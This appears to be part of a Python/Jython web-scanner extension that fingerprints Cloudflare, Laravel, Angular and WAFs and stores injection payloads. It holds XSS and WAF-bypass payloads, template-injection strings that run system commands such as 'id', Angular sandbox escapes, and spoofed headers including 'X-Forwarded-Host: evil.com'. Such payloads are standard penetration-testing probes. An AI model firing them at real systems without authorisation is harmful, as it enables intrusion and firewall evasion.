import json
import os
import re

class URL(object):
    PARAM_URL = 0
    PARAM_BODY = 1
    PARAM_COOKIE = 2
    PARAM_XML = 3
    PARAM_XML_ATTR = 4
    PARAM_MULTIPART_ATTR = 5
    PARAM_JSON = 6

class PayloadCategory(object):
    # Framework detection patterns
    FRAMEWORK_PATTERNS = {
        'Cloudflare': {
            'headers': ['cf-ray', 'cf-cache-status', '__cfduid'],
            'body': ['error 1020', 'cloudflare'],
            'errors': ['blocked by cloudflare']
        },
        'Laravel': {
            'headers': ['laravel_session'],
            'body': ['laravel', 'symfony', 'whoops'],
            'errors': ['laravel', 'illuminate\\', 'symfony']
        },
        'Angular': {
            'headers': ['angular'],
            'body': ['ng-', 'angular.js', 'angular.min.js'],
            'errors': ['angular', 'ng-']
        },
        'WAF': {
            'headers': ['x-firewall', 'x-waf'],
            'body': ['waf block', 'firewall block'],
            'errors': ['blocked by waf', 'security block']
        }
    }

    # Default payloads for each category
    DEFAULT_PAYLOADS = {
        'Cloudflare Bypass': [
            '"><img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '"><script>alert(1)</script>',
            '"><img src=x onerror=prompt(1)>'
        ],
        'Laravel': [
            '{{7*7}}',
            '{{config.items()}}',
            '@{{7*7}}',
            '{!! system(\'id\') !!}',
            '{{phpinfo()}}'
        ],
        'Angular': [
            '{{constructor.constructor(\'alert(1)\')()}}',
            '{{[].pop.constructor(\'alert(1)\')()}}',
            '{{$eval.constructor(\'alert(1)\')()}}',
            '{{$eval(\'alert(1)\')}}',
        ],
        'SSTI': [
            '${7*7}',
            '#{7*7}',
            '<%= 7*7 %>',
            '${T(java.lang.Runtime).getRuntime().exec(\'id\')}',
            '{{7*7}}'
        ],
        'XSS': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            'javascript:alert(1)//',
            '\"><script>alert(1)</script>'
        ],
        'WAF Bypass': [
            '<img src=x onerror=prompt(1)>',
            '<svg/onload=prompt(1)>',
            '<script>confirm(1)</script>',
            '<img src=x onerror=confirm(1)>',
            '<svg/onload=confirm(1)>'
        ],
        'Header Injection': [
            'X-Forwarded-For: 127.0.0.1',
            'X-Forwarded-Host: evil.com',
            'X-Remote-IP: 127.0.0.1',
            'X-Remote-Addr: 127.0.0.1',
            'X-Original-URL: /admin'
        ],
        'Custom': []
    }

    @staticmethod
    def get_payloads(category):
        """Get payloads for a specific category"""
        if category in PayloadCategory.DEFAULT_PAYLOADS:
            return PayloadCategory.DEFAULT_PAYLOADS[category]
        return []

    @staticmethod
    def detect_framework(headers, body, errors):
        """Detect framework based on response characteristics"""
        detected = []
        
        for framework, patterns in PayloadCategory.FRAMEWORK_PATTERNS.items():
            score = 0
            
            # Check headers
            for header in patterns['headers']:
                if any(header.lower() in h.lower() for h in headers):
                    score += 2

            # Check body
            for pattern in patterns['body']:
                if pattern.lower() in body.lower():
                    score += 1

            # Check errors
            for error in patterns['errors']:
                if error.lower() in errors.lower():
                    score += 2

            if score >= 2:  # Threshold for detection
                detected.append(framework)

        return detected

    @staticmethod
    def save_custom_payloads(category, payloads):
        """Save custom payloads for a category"""
        if category not in PayloadCategory.DEFAULT_PAYLOADS:
            PayloadCategory.DEFAULT_PAYLOADS[category] = []
        PayloadCategory.DEFAULT_PAYLOADS[category].extend(payloads)

class Helpers(object):
    def get_payloads(self):
        """Get payloads from the text area"""
        return [p for p in self.payloads_list.getText().split("\n") if p.strip()]

    def save_settings(self, event):
        """Save current settings to config file"""
        config = {
            'Randomize': self.randomize.isSelected(),
            'Payloads': self.get_payloads(),
            'isEnabled': self.enable.isSelected(),
            'max_concurrent_requests': int(self.concurrent_requests.getValue()),
            'request_delay': int(self.request_delay_spinner.getValue()),
            'max_logs': int(self.max_logs_spinner.getValue())
        }
        
        try:
            with open("./config.json", "w") as f:
                json.dump(config, f, indent=2)
            self.log_message("[+] Settings saved successfully")
        except Exception as e:
            self.log_message("[!] Error saving settings: %s" % str(e))

    def load_settings(self):
        """Load settings from config file"""
        try:
            if os.path.isfile('./config.json'):
                with open("./config.json", "r") as f:
                    config = json.loads(f.read())
                
                # Load basic settings
                self.enable.setSelected(config.get('isEnabled', False))
                self.randomize.setSelected(config.get('Randomize', False))
                
                # Load payloads
                payloads = config.get('Payloads', [])
                self.payloads_list.setText('\n'.join(payloads))
                
                # Load performance settings
                if 'max_concurrent_requests' in config:
                    self.concurrent_requests.setValue(config['max_concurrent_requests'])
                if 'request_delay' in config:
                    self.request_delay_spinner.setValue(config['request_delay'])
                if 'max_logs' in config:
                    self.max_logs_spinner.setValue(config['max_logs'])
                
                self.log_message("[+] Settings loaded successfully")
        except Exception as e:
            self.log_message("[!] Error loading settings: %s" % str(e))
